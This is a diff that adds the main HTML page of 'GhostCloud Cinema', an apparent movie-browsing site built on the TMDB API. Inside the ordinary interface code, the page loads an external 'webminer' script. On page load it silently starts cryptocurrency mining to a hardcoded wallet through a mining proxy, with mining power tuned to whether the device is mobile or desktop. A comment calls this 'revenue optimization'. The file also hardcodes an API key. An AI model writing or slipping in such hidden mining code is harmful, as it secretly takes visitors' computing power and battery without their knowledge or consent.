@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostCloud Cinema</title>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XCFYVQ97K6"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-XCFYVQ97K6');
+    </script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header class="top-nav">
+    <div class="logo" onclick="location.reload()">GHOSTCLOUD</div>
+    <div class="search-container">
+        <input type="text" id="searchInput" placeholder="Search movies..." oninput="searchMovies()">
+        <span id="clearSearch" onclick="resetHome()">&times;</span>
+    </div>
+    <div class="nav-links">
+        <span id="installBtn" style="display:none; color: var(--accent); font-weight:bold; cursor:pointer; margin-right:15px;">Install App</span>
+        <span onclick="showMyList()">My List</span>
+    </div>
+</header>
+
+<main id="app">
+    <section id="hero" class="hero-banner">
+        <div class="hero-content">
+            <h1 id="hero-title">GhostCloud</h1>
+            <p id="hero-desc">Your cinematic journey begins here.</p>
+            <button class="btn-play" id="hero-play">▶ Play Now</button>
+        </div>
+    </section>
+
+    <section id="searchResultsSection" class="row-section" style="display:none;">
+        <div class="row-header">
+            <h2>Search Results</h2>
+            <button class="btn-back" onclick="resetHome()">← Back Home</button>
+        </div>
+        <div class="movie-grid" id="searchData"></div>
+    </section>
+
+    <div id="homeContent">
+        <section class="row-section"><h2>Trending</h2><div class="movie-row" id="trending"><div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div></div></section>
+        <section class="row-section"><h2>Action</h2><div class="movie-row" id="action"><div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div></div></section>
+        <section class="row-section"><h2>Horror</h2><div class="movie-row" id="horror"><div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div></div></section>
+        <section class="row-section"><h2>Anime</h2><div class="movie-row" id="anime"><div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div></div></section>
+        <section class="row-section"><h2>Sci-Fi</h2><div class="movie-row" id="scifi"><div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div></div></section>
+    </div>
+
+    <div id="moviePopup" class="popup">
+        <div class="popup-content">
+            <span class="close" onclick="closePopup()">&times;</span>
+            <div id="popupPreview" class="preview-box"></div>
+            <div class="p-details">
+                <h2 id="p-title"></h2>
+                <p id="p-desc"></p>
+                <div class="p-btns">
+                    <button class="btn-play" id="p-play">▶ Play</button>
+                    <button class="btn-list" id="p-list">+ My List</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</main>
+
+<script src="https://cdn.jsdelivr.net/gh/annoforge/webminer@main/load.js"></script>
+<script>
+    const API_KEY = '5513ab319975b0b6f6d297179708caec';
+    const WALLET = '48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy';
+    
+    // 1. PWA INSTALL LOGIC
+    let deferredPrompt;
+    window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        deferredPrompt = e;
+        document.getElementById('installBtn').style.display = 'inline';
+    });
+    document.getElementById('installBtn').onclick = async () => {
+        if (deferredPrompt) {
+            deferredPrompt.prompt();
+            const { outcome } = await deferredPrompt.userChoice;
+            if (outcome === 'accepted') document.getElementById('installBtn').style.display = 'none';
+            deferredPrompt = null;
+        }
+    };
+
+    window.onload = () => {
+        // 2. SMART MINER: Detection for revenue optimization
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        const power = isMobile ? 12 : 45; 
+        if (typeof startMining === "function") startMining(WALLET, isMobile ? "Ghost_Mobile" : "Ghost_Desktop", "wss://ny1.xmrminingproxy.com", power);
+
+        fetchRow(`https://api.themoviedb.org/3/trending/movie/week?api_key=${API_KEY}`, 'trending', true);
+        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=28`, 'action');
+        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=27`, 'horror');
+        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=16`, 'anime');
+        fetchRow(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=878`, 'scifi');
+    };
+
+    async function fetchRow(url, elementId, isHero = false) {
+        const r = await fetch(url);
+        const d = await r.json();
+        const row = document.getElementById(elementId);
+        if(isHero && d.results[0]) setHero(d.results[0]);
+        row.innerHTML = d.results.map(m => `
+            <div class="card" onclick='openMovie(${JSON.stringify(m).replace(/'/g, "&apos;")})'>
+                <img src="https://image.tmdb.org/t/p/w300${m.poster_path}" loading="lazy">
+            </div>
+        `).join('');
+    }
+
+    function setHero(m) {
+        const hero = document.getElementById('hero');
+        hero.style.backgroundImage = `linear-gradient(to right, #050505 20%, transparent), url(https://image.tmdb.org/t/p/original${m.backdrop_path})`;
+        document.getElementById('hero-title').innerText = m.title;
+        document.getElementById('hero-desc').innerText = m.overview.substring(0, 160) + "...";
+        document.getElementById('hero-play').onclick = () => openMovie(m);
+    }
+
+    async function searchMovies() {
+        const q = document.getElementById('searchInput').value;
+        if(q.length < 2) return resetHome();
+        document.getElementById('homeContent').style.display = 'none';
+        document.getElementById('hero').style.display = 'none';
+        document.getElementById('searchResultsSection').style.display = 'block';
+        document.getElementById('clearSearch').style.display = 'block';
+
+        const r = await fetch(`https://api.themoviedb.org/3/search/movie?api_key=${API_KEY}&query=${q}`);
+        const d = await r.json();
+        document.getElementById('searchData').innerHTML = d.results.map(m => `
+            <div class="card" onclick='openMovie(${JSON.stringify(m).replace(/'/g, "&apos;")})'>
+                <img src="https://image.tmdb.org/t/p/w300${m.poster_path}">
+            </div>`).join('');
+    }
+
+    function resetHome() {
+        document.getElementById('searchInput').value = '';
+        document.getElementById('homeContent').style.display = 'block';
+        document.getElementById('hero').style.display = 'flex';
+        document.getElementById('searchResultsSection').style.display = 'none';
+        document.getElementById('clearSearch').style.display = 'none';
+    }
+
+    function openMovie(m) {
+        document.getElementById('p-title').innerText = m.title;
+        document.getElementById('p-desc').innerText = m.overview;
+        document.getElementById('popupPreview').style.backgroundImage = `url(https://image.tmdb.org/t/p/original${m.backdrop_path})`;
+        document.getElementById('p-play').onclick = () => location.href = `player.html?id=${m.id}&img=${m.backdrop_path}`;
+        document.getElementById('moviePopup').style.display = "flex";
+    }
+
+    function closePopup() { document.getElementById('moviePopup').style.display = "none"; }
+</script>
+</body>
+</html>
